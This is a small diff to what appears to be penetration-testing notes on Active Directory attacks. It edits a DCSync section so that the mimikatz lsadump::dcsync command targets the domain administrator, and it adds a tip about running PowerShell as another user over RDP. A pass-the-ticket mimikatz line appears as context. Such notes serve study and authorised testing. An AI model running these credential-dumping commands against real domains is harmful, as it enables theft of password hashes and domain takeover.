@@ -97,6 +97,7 @@ C:\> mimikatz.exe privilege::debug "kerberos::ptt <ticket_file> exit
 
 ### [[Abusing ACLs#DCSync|DCSync]]
 > We may have to use `runas /netonly /user:[domain]\[user] powershell` as we need to be running in the context of the user with the DCSync permissions
+> Or you may have to `RClick > Run as another user` if you have RDP access to powershell
 ```PowerShell
-mimikatz.exe privilege::debug "lsadump::dcsync /domain:[domain] /user:[domain]\[user]"
+mimikatz.exe privilege::debug "lsadump::dcsync /domain:[domain] /user:[domain]\administrator"
 ```
